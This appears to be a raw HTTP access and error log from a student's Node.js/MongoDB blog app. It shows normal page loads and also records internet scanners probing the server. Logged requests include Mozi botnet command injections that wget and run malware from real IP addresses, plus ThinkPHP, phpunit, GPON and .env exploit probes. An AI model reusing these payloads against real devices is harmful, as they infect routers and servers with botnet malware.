(node:19506) DeprecationWarning: current Server Discovery and Monitoring engine is deprecated, and will be removed in a future version. To use the new Server Discover and Monitoring engine, pass option { useUnifiedTopology: true } to the MongoClient constructor.
Mongoose disconnected
Mongoose connection error: MongoNetworkError: failed to connect to server [localhost:27027] on first connect [Error: connect ECONNREFUSED 127.0.0.1:27027
    at TCPConnectWrap.afterConnect [as oncomplete] (net.js:1141:16) {
  name: 'MongoNetworkError'
}]
(node:19506) UnhandledPromiseRejectionWarning: MongoNetworkError: failed to connect to server [localhost:27027] on first connect [Error: connect ECONNREFUSED 127.0.0.1:27027
    at TCPConnectWrap.afterConnect [as oncomplete] (net.js:1141:16) {
  name: 'MongoNetworkError'
}]
    at Pool.<anonymous> (/home/bitnami/Lab3/node_modules/mongodb/lib/core/topologies/server.js:438:11)
    at Pool.emit (events.js:315:20)
    at /home/bitnami/Lab3/node_modules/mongodb/lib/core/connection/pool.js:562:14
    at /home/bitnami/Lab3/node_modules/mongodb/lib/core/connection/pool.js:995:11
    at /home/bitnami/Lab3/node_modules/mongodb/lib/core/connection/connect.js:32:7
    at callback (/home/bitnami/Lab3/node_modules/mongodb/lib/core/connection/connect.js:280:5)
    at Socket.<anonymous> (/home/bitnami/Lab3/node_modules/mongodb/lib/core/connection/connect.js:310:7)
    at Object.onceWrapper (events.js:422:26)
    at Socket.emit (events.js:315:20)
    at emitErrorNT (internal/streams/destroy.js:92:8)
    at emitErrorAndCloseNT (internal/streams/destroy.js:60:3)
    at processTicksAndRejections (internal/process/task_queues.js:84:21)
(node:19506) UnhandledPromiseRejectionWarning: Unhandled promise rejection. This error originated either by throwing inside of an async function without a catch block, or by rejecting a promise which was not handled with .catch(). To terminate the node process on unhandled promise rejection, use the CLI flag `--unhandled-rejections=strict` (see https://nodejs.org/api/cli.html#cli_unhandled_rejections_mode). (rejection id: 1)
(node:19506) [DEP0018] DeprecationWarning: Unhandled promise rejections are deprecated. In the future, promise rejections that are not handled will terminate the Node.js process with a non-zero exit code.
[0mGET / [32m200 [0m49.817 ms - 954[0m
[0mGET http://www.proxylists.net/proxyjudge.php [33m404 [0m4.458 ms - 1418[0m
[0mGET /blogList [36m304 [0m109.402 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m5.467 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m8.150 ms - -[0m
[0mGET /css/fontawesome-all.css [36m304 [0m0.695 ms - -[0m
[0mGET /js/jquery.min.js [36m304 [0m0.649 ms - -[0m
[0mGET /js/bootstrap.min.js [36m304 [0m0.537 ms - -[0m
[0mGET /webfonts/fa-solid-900.woff2 [36m304 [0m0.540 ms - -[0m
[0mGET / [36m304 [0m1.092 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.394 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.543 ms - -[0m
[0mGET /css/fontawesome-all.css [36m304 [0m0.614 ms - -[0m
[0mGET /js/bootstrap.min.js [36m304 [0m3.227 ms - -[0m
[0mGET /js/jquery.min.js [36m304 [0m1.138 ms - -[0m
[0mGET /.env [33m404 [0m1.232 ms - 1418[0m
[0mPOST / [33m404 [0m60.773 ms - 1413[0m
[0mGET / [32m200 [0m1.278 ms - 954[0m
[0mGET /blogAdd [36m304 [0m1.226 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.384 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.529 ms - -[0m
[0mGET /css/fontawesome-all.css [36m304 [0m0.658 ms - -[0m
[0mGET /js/jquery.min.js [36m304 [0m0.607 ms - -[0m
[0mGET /js/bootstrap.min.js [36m304 [0m0.460 ms - -[0m
[0mGET /blogList [36m304 [0m2.449 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.979 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m2.329 ms - -[0m
[0mGET /css/fontawesome-all.css [36m304 [0m2.518 ms - -[0m
[0mGET /js/jquery.min.js [36m304 [0m2.162 ms - -[0m
[0mGET /js/bootstrap.min.js [36m304 [0m0.454 ms - -[0m
[0mGET /webfonts/fa-solid-900.woff2 [36m304 [0m0.518 ms - -[0m
[0mGET /blogAdd [36m304 [0m1.015 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.763 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.949 ms - -[0m
[0mGET /js/jquery.min.js [36m304 [0m1.060 ms - -[0m
[0mGET /css/fontawesome-all.css [36m304 [0m1.100 ms - -[0m
[0mGET /js/bootstrap.min.js [36m304 [0m0.451 ms - -[0m
(node:20429) DeprecationWarning: current URL string parser is deprecated, and will be removed in a future version. To use the new parser, pass option { useNewUrlParser: true } to MongoClient.connect.
(node:20429) DeprecationWarning: current Server Discovery and Monitoring engine is deprecated, and will be removed in a future version. To use the new Server Discover and Monitoring engine, pass option { useUnifiedTopology: true } to the MongoClient constructor.
Mongoose connected to mongodb://localhost/blogger
[0mGET / [36m304 [0m9.841 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m1.350 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m2.389 ms - -[0m
[0mGET /js/bootstrap.min.js [36m304 [0m1.737 ms - -[0m
[0mGET /css/fontawesome-all.css [36m304 [0m1.938 ms - -[0m
[0mGET /js/jquery.min.js [36m304 [0m1.936 ms - -[0m
[0mGET /blogAdd [36m304 [0m1.318 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.406 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m1.463 ms - -[0m
[0mGET /js/bootstrap.min.js [36m304 [0m1.509 ms - -[0m
[0mGET /js/jquery.min.js [36m304 [0m3.192 ms - -[0m
[0mGET /css/fontawesome-all.css [36m304 [0m3.214 ms - -[0m
[0mGET /blogList [36m304 [0m1.666 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.528 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m1.385 ms - -[0m
[0mGET /js/bootstrap.min.js [36m304 [0m0.855 ms - -[0m
[0mGET /css/fontawesome-all.css [36m304 [0m2.104 ms - -[0m
[0mGET /js/jquery.min.js [36m304 [0m2.125 ms - -[0m
[0mGET /webfonts/fa-solid-900.woff2 [36m304 [0m0.659 ms - -[0m
[0mGET /blogEdit [36m304 [0m1.342 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.399 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m3.384 ms - -[0m
[0mGET /js/bootstrap.min.js [36m304 [0m1.477 ms - -[0m
[0mGET /js/jquery.min.js [36m304 [0m3.985 ms - -[0m
[0mGET /css/fontawesome-all.css [36m304 [0m3.955 ms - -[0m
[0mGET /blogDelete [36m304 [0m1.482 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.942 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m1.024 ms - -[0m
[0mGET /js/bootstrap.min.js [36m304 [0m0.960 ms - -[0m
[0mGET /js/jquery.min.js [36m304 [0m2.396 ms - -[0m
[0mGET /css/fontawesome-all.css [36m304 [0m2.456 ms - -[0m
[0mGET / [32m200 [0m1.607 ms - 954[0m
[0mGET /stylesheets/style.css [32m200 [0m2.580 ms - 111[0m
[0mGET /css/fontawesome-all.css [32m200 [0m3.691 ms - 51609[0m
[0mGET /js/bootstrap.min.js [32m200 [0m0.982 ms - 60044[0m
[0mGET /js/jquery.min.js [32m200 [0m3.773 ms - 89476[0m
[0mGET /css/bootstrap.min.css [32m200 [0m2.889 ms - 160302[0m
[0mGET /favicon.ico [33m404 [0m1.787 ms - 1418[0m
[0mGET /css/bootstrap.min.css [32m200 [0m0.715 ms - 160302[0m
[0mGET / [32m200 [0m0.762 ms - 954[0m
[0mGET /favicon.ico [33m404 [0m1.523 ms - 1418[0m
[0mGET /blogList [32m200 [0m1.432 ms - 3324[0m
[0mGET /stylesheets/style.css [36m304 [0m0.414 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.613 ms - -[0m
[0mGET /css/fontawesome-all.css [36m304 [0m1.384 ms - -[0m
[0mGET /js/jquery.min.js [36m304 [0m0.518 ms - -[0m
[0mGET /js/bootstrap.min.js [36m304 [0m0.459 ms - -[0m
[0mGET /webfonts/fa-solid-900.woff2 [32m200 [0m0.626 ms - 50372[0m
[0mGET /webfonts/fa-regular-400.woff2 [32m200 [0m0.666 ms - 12188[0m
[0mGET /favicon.ico [33m404 [0m0.880 ms - 1418[0m
[0mGET /blogAdd [32m200 [0m0.977 ms - 940[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.859 ms - -[0m
[0mGET /css/fontawesome-all.css [36m304 [0m2.122 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m1.777 ms - -[0m
[0mGET /js/bootstrap.min.js [36m304 [0m1.916 ms - -[0m
[0mGET /js/jquery.min.js [36m304 [0m0.546 ms - -[0m
[0mGET /favicon.ico [33m404 [0m0.854 ms - 1418[0m
[0mGET / [32m200 [0m0.844 ms - 954[0m
[0mGET / [32m200 [0m0.856 ms - 954[0m
[0mGET /solr/admin/info/system?wt=json [33m404 [0m1.204 ms - 1418[0m
[0mGET /shell?cd+/tmp;rm+-rf+*;wget+http://218.28.160.174:60204/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws [33m404 [0m2.254 ms - 1418[0m
[0mGET /?XDEBUG_SESSION_START=phpstorm [32m200 [0m1.113 ms - 954[0m
[0mGET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> [32m200 [0m1.076 ms - 954[0m
[0mGET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP [33m404 [0m0.983 ms - 1418[0m
[0mGET / [32m200 [0m1.242 ms - 954[0m
[0mGET / [32m200 [0m0.765 ms - 954[0m
[0mGET / [32m200 [0m1.053 ms - 954[0m
[0mPOST /api/jsonws/invoke [33m404 [0m10.409 ms - 1413[0m
[0mGET / [32m200 [0m0.893 ms - 954[0m
[0mGET / [32m200 [0m1.073 ms - 954[0m
[0mGET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://182.121.23.99:45858/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 [33m404 [0m1.305 ms - 1418[0m
[0mGET / [32m200 [0m1.062 ms - 954[0m
[0mGET / [32m200 [0m0.809 ms - 954[0m
[0mGET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://61.52.37.107:41392/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 [33m404 [0m1.246 ms - 1418[0m
[0mGET / [32m200 [0m1.135 ms - 954[0m
[0mGET /config/getuser?index=0 [33m404 [0m1.261 ms - 1418[0m
[0mGET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404 [0m1.750 ms - 1418[0m
[0mGET /ReportServer [33m404 [0m1.128 ms - 1418[0m
[0mPOST /GponForm/diag_Form?images/ [33m404 [0m1.470 ms - 1413[0m
[0mPOST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404 [0m2.184 ms - 1413[0m
[0mGET / [32m200 [0m1.084 ms - 954[0m
[0mGET /portal/redlion [33m404 [0m1.345 ms - 1418[0m
[0mGET /boaform/admin/formLogin?username=adminisp&psd=adminisp [33m404 [0m1.249 ms - 1418[0m
[0mGET / [32m200 [0m0.847 ms - 954[0m
[0mGET /config/getuser?index=0 [33m404 [0m0.889 ms - 1418[0m
[0mGET / [32m200 [0m0.785 ms - 954[0m
[0mGET /TP/public/index.php [33m404 [0m1.060 ms - 1418[0m
[0mGET /TP/index.php [33m404 [0m0.950 ms - 1418[0m
[0mGET /thinkphp/html/public/index.php [33m404 [0m0.957 ms - 1418[0m
[0mGET /html/public/index.php [33m404 [0m0.965 ms - 1418[0m
[0mGET /public/index.php [33m404 [0m1.024 ms - 1418[0m
[0mGET /TP/html/public/index.php [33m404 [0m0.912 ms - 1418[0m
[0mGET /elrekt.php [33m404 [0m0.972 ms - 1418[0m
[0mGET /index.php [33m404 [0m0.993 ms - 1418[0m
[0mGET / [32m200 [0m1.503 ms - 954[0m
[0mGET http://5.188.210.227/echo.php [33m404 [0m1.404 ms - 1418[0m
[0mGET / [32m200 [0m0.860 ms - 954[0m
[0mGET / [32m200 [0m0.791 ms - 954[0m
[0mGET / [32m200 [0m1.159 ms - 954[0m
[0mGET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://182.114.124.72:51450/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 [33m404 [0m0.956 ms - 1418[0m
[0mGET / [32m200 [0m0.864 ms - 954[0m
